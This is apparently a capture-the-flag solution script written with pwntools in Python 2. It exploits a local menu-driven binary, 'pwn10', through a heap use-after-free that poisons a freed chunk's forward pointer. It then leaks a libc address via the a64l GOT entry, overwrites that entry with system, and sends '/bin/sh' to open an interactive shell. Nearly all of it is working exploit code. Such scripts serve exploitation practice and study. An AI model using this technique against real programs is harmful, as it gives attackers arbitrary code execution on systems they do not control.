from pwn import *
context.binary = './pwn10'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = elf.libc

p = process('./pwn10')

def dbg():
	raw_input()

def choice(ch):
	p.recvuntil('Give me your choice : \n')
	p.send(str(ch))

def add(content):
	size = len(content)
	choice(1)
	p.recvline()
	p.send(str(size))
	p.recvline()
	p.send(content)
	print "add a chunk success"

def edit(idx, content):
	size = len(content)
	choice(3)
	p.recvline()
	p.send(str(idx))
	p.recvline()
	p.send(str(size))
	p.recvline()
	p.send(content)
	print "edit a chunk success"

def editagain(content):
	size = len(content)
	choice(3)
	p.recvline()
	p.send(str(size))
	p.recvline()
	p.send(content)
	print "edit a chunk success"

def show(idx):
	choice(2)
	p.recvline()
	p.send(str(idx))
	print "show a chunk success"

def delete(idx):
	choice(4)
	p.recvline()
	p.send(str(idx))
	print "delete a chunk success"

add('a'*0x10)						#0		
add('b'*0x10)						#1
add('/bin/sh\x00')					#2
add('c'*0x10)						#3

gdb.attach(p, 'b* 0x400F81')
edit(0,'b'*0x10) 	#chunk_0_addr is in cache
delete(0)			#node0, content0

editagain('\x60')			#chunk_0_fd is in our writen points to chunk1'node	

add(p64(elf.got['a64l']))	#node0 is content0, content0 is node1
show(1)

#3only leak 2 bytes
atol_addr = u16(p.recv(2))
system_addr = atol_addr - libc.symbols['a64l'] + libc.symbols['system']

print 'system addr => ' + hex(system_addr)
edit(1,p16(system_addr))

#gdb.attach(p)
p.recvuntil("choice :")
p.sendline("/bin/sh\x00")

p.interactive()
p.close()
